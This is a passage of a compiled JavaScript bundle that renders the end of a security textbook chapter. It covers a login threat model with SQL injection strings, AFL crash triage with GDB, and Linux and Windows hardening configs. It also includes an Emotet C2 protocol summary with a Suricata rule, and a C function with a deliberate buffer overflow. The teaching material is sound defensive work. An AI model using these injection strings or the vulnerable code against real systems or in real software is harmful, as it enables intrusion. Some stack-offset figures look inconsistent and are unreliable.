        children: "Stage 3: Decompose → Login Component\n  Entry points: POST /api/login, GET /api/session\n  Trust boundary: DMZ / Internal network\n  Assets: User credentials, session tokens, authentication database\n\nStage 4: Threat Analysis\n  └── Login Bypass\n      ├── SQL injection on username field\n      ├── Session token prediction\n      ├── Credential stuffing via API rate (no rate limit)\n      └── MFA bypass via backup code brute-force\n\nStage 6: Attack Modeling\n  Attack Tree: SQL Injection on Login\n  └── OR\n      ├── Username field with ' OR 1=1 --\n      │   ├── Parameterized query? → Blocked\n      │   └── String concatenation? → Vulnerability!\n      └── Password field with admin' --\n          ├── Input validation? → Blocked\n          └── No validation? → Vulnerability!\n\nStage 7: Risk Scoring\n  [SQL Injection on Login] Damage=10 × Reproducibility=10 × Exploitability=8\n  Likelihood=0.7 × Impact=10 = 56 (CRITICAL)\n  Mitigation: Parameterize all queries\n  Residual Risk: MEDIUM (imperfect implementation risk)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-fuzzing-crash-triaging-with-gdb",
      children: "Extended Fuzzing: Crash Triaging with GDB"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# After AFL finds crashes, triage each one\n\n# Find crash inputs\nls fuzz_out/default/crashes/\n\n# For each crash, determine the root cause\nfor crash in fuzz_out/default/crashes/id:*; do\n    echo \"=== Analyzing: $crash ===\"\n    ./vuln_fuzz \"$crash\"\n    echo \"Exit code: $?\"\ndone\n\n# Use GDB to get detailed crash info\ngdb -q --batch -ex \"run < crash_input\" -ex \"bt\" -ex \"info registers\" ./vuln_fuzz 2>&1\n\n# GDB batch output:\n# Program received signal SIGSEGV, Segmentation fault.\n# 0x41414141 in ?? ()\n# eip            0x41414141\n# esp            0xffffd4b0\n\n# Use Python/Binary Ninja to understand crash reachability\n# from pwn import *\n# crash_data = read(\"crash_input\")\n# core = Coredump(\"./core\")\n# print(f\"Fault at: {hex(core.fault_addr)}\")\n# print(f\"Stack: {core.stack[:64].hex()}\")\n\n# Minimize crash input with AFL tools\nafl-tmin -i crash_input -o minimized_input -- ./vuln_fuzz @@\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "comprehensive-configuration-hardening-files",
      children: "Comprehensive Configuration Hardening Files"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "linux-complete-sysctl-hardening",
      children: "Linux: Complete sysctl Hardening"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# /etc/sysctl.d/99-security.conf\n# Network hardening\nnet.ipv4.conf.all.rp_filter = 1\nnet.ipv4.conf.default.rp_filter = 1\nnet.ipv4.conf.all.accept_redirects = 0\nnet.ipv4.conf.all.secure_redirects = 0\nnet.ipv4.conf.all.send_redirects = 0\nnet.ipv4.conf.all.accept_source_route = 0\nnet.ipv6.conf.all.accept_redirects = 0\nnet.ipv6.conf.all.accept_source_route = 0\n\n# Disable ICMP redirects\nnet.ipv4.conf.all.accept_redirects = 0\nnet.ipv6.conf.all.accept_redirects = 0\n\n# Enable TCP SYN cookie protection (mitigates SYN flood)\nnet.ipv4.tcp_syncookies = 1\nnet.ipv4.tcp_syn_retries = 5\nnet.ipv4.tcp_synack_retries = 2\n\n# Ignore ICMP echo requests (optional → disables ping)\nnet.ipv4.icmp_echo_ignore_all = 1\n\n# Ignore broadcast ICMP (smurf attack mitigation)\nnet.ipv4.icmp_echo_ignore_broadcasts = 1\nnet.ipv4.icmp_ignore_bogus_error_responses = 1\n\n# Restrict kernel log access\nkernel.dmesg_restrict = 1\nkernel.kptr_restrict = 2\n\n# ASLR (full)\nkernel.randomize_va_space = 2\n\n# Restrict kexec (prevent unauthorized kernel replacement)\nkernel.kexec_load_disabled = 1\n\n# Restrict ptrace to CAP_SYS_PTRACE processes\nkernel.yama.ptrace_scope = 2\n\n# Disable BPF JIT (mitigates Spectre v2 in BPF)\nnet.core.bpf_jit_enable = 0\n\n# Restrict user namespaces (mitigates privilege escalation)\nuser.max_user_namespaces = 0\n\n# Protect FIFO/regular file creation in world-writable directories\nfs.protected_fifos = 2\nfs.protected_regular = 2\nfs.protected_hardlinks = 1\nfs.protected_symlinks = 1\n\n# Disable core dumps for SUID\nfs.suid_dumpable = 0\n\n# Perf event hardening\nkernel.perf_event_paranoid = 3\nkernel.perf_event_max_sample_rate = 1\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "windows-powershell-hardening-script",
      children: "Windows: PowerShell Hardening Script"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-powershell",
        children: "# Windows-Harden.ps1 → Run as Administrator\n\n# ============ EXPLOIT PROTECTION ============\n# Windows Defender Exploit Protection settings\nSet-ProcessMitigation -System -Enable DEP, ForceRelocateImages\nSet-ProcessMitigation -System -Enable ASLR, BottomUp, HighEntropy\nSet-ProcessMitigation -System -Enable CFG, SuppressExports\nSet-ProcessMitigation -System -Enable SEHOP, SEHOPTelemetry\n\n# ============ WINDOWS DEFENDER ============\nSet-MpPreference -DisableRealtimeMonitoring $false\nSet-MpPreference -CloudBlockLevel High\nSet-MpPreference -CloudTimeout 50\nSet-MpPreference -PUAProtection Enabled\nSet-MpPreference -SubmitSamplesConsent Always\nSet-MpPreference -HighThreatDefaultAction Quarantine\nSet-MpPreference -ModerateThreatDefaultAction Quarantine\nSet-MpPreference -LowThreatDefaultAction Quarantine\nSet-MpPreference -SevereThreatDefaultAction Quarantine\n\n# ============ FIREWALL ============\n# Default inbound block\nSet-NetFirewallProfile -Profile Domain,Public,Private -Enabled True -DefaultInboundAction Block\nSet-NetFirewallProfile -Profile Domain,Public,Private -LogFileName \"%SystemRoot%\\System32\\LogFiles\\Firewall\\pfirewall.log\"\nSet-NetFirewallProfile -Profile Domain,Public,Private -LogMaxSizeKilobytes 16384\n\n# ============ LOGGING ============\n# Enable PowerShell Script Block Logging\nNew-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" -Force\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" -Name \"EnableScriptBlockLogging\" -Value 1\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" -Name \"EnableScriptBlockInvocationLogging\" -Value 1\n\n# ============ SMB ============\n# Disable SMBv1 (used by EternalBlue)\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart\n\n# ============ LSASS PROTECTION ============\n# Enable RunAsPPL (protects LSASS from credential dumping)\nNew-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" -Force\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" -Name \"RunAsPPL\" -Value 1\n\n# ============ RDP HARDENING ============\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" -Name \"UserAuthentication\" -Value 1\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" -Name \"SecurityLayer\" -Value 2\n\n# ============ AUDIT POLICY ============\nauditpol /set /subcategory:\"Process Creation\" /failure:enable /success:enable\nauditpol /set /subcategory:\"Logon\" /failure:enable /success:enable\nauditpol /set /subcategory:\"Registry\" /failure:enable /success:enable\nauditpol /set /subcategory:\"File System\" /failure:enable /success:enable\nauditpol /set /subcategory:\"Kernel Object\" /failure:enable /success:enable\nauditpol /set /subcategory:\"Detailed File Share\" /failure:enable /success:enable\n\nWrite-Host \"Hardening completed. Restart recommended.\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-malware-case-study-emotet--botnet-evolution",
      children: "Extended Malware Case Study: Emotet → Botnet Evolution"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "emotet-technical-breakdown",
      children: "Emotet Technical Breakdown"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Emotet evolved over 10+ years through multiple transformations:"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Years"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Key Technique"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2014"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Banking Trojan"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Web injects against banks"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2016"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware downloader"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Downloads Dridex, TrickBot, etc."
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2018"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Spam propagator"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Worms via Outlook + malicious docs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2020"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Modular malware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Modules for credential theft, email harvesting, spam relay"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2021"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disrupted (takedown)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Law enforcement coordinated takedown"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Emotet C2 protocol:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "1. Beacon: POST /<random_string>.php with encrypted system info\n2. Response: Encrypted payload (DLL) loaded into regsvr32.exe\n3. Propagation: SMB brute-force + PsExec spread to network\n4. Persistence: Scheduled task or service + registry Run key\n5. Lateral movement: Steals Outlook contacts → sends phishing emails\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection signature (Zeek/Suricata):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "alert http $HOME_NET any -> $EXTERNAL_NET any (\n    msg:\"Emotet C2 Beacon Detected\";\n    content:\"POST\"; http_method;\n    content:\".php\"; http_uri;\n    pcre:\"/([a-z0-9]{16}\\.php)$/\";\n    content:\"User-Agent: Mozilla/4.0\";\n    flow:to_server, established;\n    sid:1000001; rev:1;\n)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-buffer-overflow-stack-frame-diagrams-with-more-detail",
      children: "Extended Buffer Overflow: Stack Frame Diagrams with More Detail"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "complete-stack-frame-for-x86-32-bit",
      children: "Complete Stack Frame for x86 (32-bit)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "void func(char *input) {\n    char buffer[32];\n    int i;\n    int safety = 0xDEAD;\n    for (i = 0; i < 100; i++) {\n        buffer[i] = input[i];  // intentional overflow\n    }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Stack layout before overflow:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Address (relative to EBP)   Content                 Size\n+----------------------------+----------------------+--------\nEBP + 8                      input pointer          4 bytes\nEBP + 4                      return address         4 bytes  ← TARGET\nEBP + 0                      saved EBP              4 bytes  ← TARGET\nEBP - 4                      safety = 0x0000DEAD    4 bytes\nEBP - 8                      i                      4 bytes\nEBP - 12                     (padding)              12 bytes\nEBP - 24                     buffer[11..0]          12 bytes\nEBP - 36                     buffer[23..12]         12 bytes\nEBP - 44                     buffer[31..24]         8 bytes\nESP →                        buffer[0]              1 byte\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Stack layout AFTER overflow (100 bytes written into 32-byte buffer):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Address                     Content                  Source Offset\n+---------------------------+------------------------+--------------\nEBP + 8                     bytes 96-99              96-99 (input[96..99])\nEBP + 4                     bytes 92-95 (return)     92-95 → EIP hijack!\nEBP + 0                     bytes 88-91 (EBP)        88-91\nEBP - 4                     bytes 84-87              84-87 → safety overwritten\nEBP - 8                     bytes 80-83 (i)          80-83 → loop counter corrupted\nEBP - 12                    bytes 68-79              68-79\nEBP - 24                    bytes 56-67              56-67\nEBP - 36                    bytes 44-55              44-55\nEBP - 44                    bytes 32-43              32-43\nESP →                       bytes 0-31               0-31 (buffer)\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Key insight:"
      }), " The ", (0,jsx_runtime.jsx)(_components.code, {
        children: "safety"
      }), " variable (0xDEAD) sits between i and the saved EBP. A 36-byte overflow would overwrite it. A 40-byte overflow hits EBP. A 44-byte overflow hits the return address. But the loop runs to ", (0,jsx_runtime.jsx)(_components.code, {
        children: "< 100"
      }), " → well past all of them."]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "chapter-4-end",
      children: "Chapter 4 End"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.em, {
        children: "All sections complete. This chapter covers OS hardening, buffer overflows (stack/heap/SEH), shellcode development, ROP/ret2libc, ASLR/DEP/CFG, malware types, SSDLC threat modeling, secure coding (C/C++/Java/JS), fuzzing (AFL/libFuzzer), static/dynamic analysis (Flawfinder, RATS, ASan), and case studies (SolarWinds, NotPetya, Stuxnet, Morris Worm)."
      })
    })]
  });
}
function MDXContent(props = {}) {
  const {wrapper: MDXLayout} = {
    ...(0,lib/* useMDXComponents */.R)(),
    ...props.components
  };
  return MDXLayout ? (0,jsx_runtime.jsx)(MDXLayout, {
    ...props,
    children: (0,jsx_runtime.jsx)(_createMdxContent, {
      ...props
    })
  }) : _createMdxContent(props);
}



/***/ },

/***/ 28453
(__unused_webpack___webpack_module__, __webpack_exports__, __webpack_require__) {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   R: () => (/* binding */ useMDXComponents),
/* harmony export */   x: () => (/* binding */ MDXProvider)
/* harmony export */ });
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(96540);
/**
 * @import {MDXComponents} from 'mdx/types.js'
 * @import {Component, ReactElement, ReactNode} from 'react'
 */

/**
 * @callback MergeComponents
 *   Custom merge function.
 * @param {Readonly<MDXComponents>} currentComponents
 *   Current components from the context.
 * @returns {MDXComponents}
 *   Additional components.
 *
 * @typedef Props
 *   Configuration for `MDXProvider`.
 * @property {ReactNode | null | undefined} [children]
 *   Children (optional).
 * @property {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
 *   Additional components to use or a function that creates them (optional).
 * @property {boolean | null | undefined} [disableParentContext=false]
 *   Turn off outer component context (default: `false`).
 */



/** @type {Readonly<MDXComponents>} */
const emptyComponents = {}

const MDXContext = react__WEBPACK_IMPORTED_MODULE_0__.createContext(emptyComponents)

/**
 * Get current components from the MDX Context.
 *
 * @param {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
 *   Additional components to use or a function that creates them (optional).
 * @returns {MDXComponents}
 *   Current components.
 */
function useMDXComponents(components) {
  const contextComponents = react__WEBPACK_IMPORTED_MODULE_0__.useContext(MDXContext)

  // Memoize to avoid unnecessary top-level context changes
  return react__WEBPACK_IMPORTED_MODULE_0__.useMemo(
    function () {
      // Custom merge via a function prop
      if (typeof components === 'function') {
        return components(contextComponents)
      }

      return {...contextComponents, ...components}
    },
    [contextComponents, components]
  )
}

/**
 * Provider for MDX context.
 *
 * @param {Readonly<Props>} properties
 *   Properties.
 * @returns {ReactElement}
 *   Element.
 * @satisfies {Component}
 */
function MDXProvider(properties) {
  /** @type {Readonly<MDXComponents>} */
  let allComponents

  if (properties.disableParentContext) {
    allComponents =
      typeof properties.components === 'function'
        ? properties.components(emptyComponents)
        : properties.components || emptyComponents
  } else {
    allComponents = useMDXComponents(properties.components)
  }

  return react__WEBPACK_IMPORTED_MODULE_0__.createElement(
    MDXContext.Provider,
    {value: allComponents},
    properties.children
  )
}


/***/ }

}]);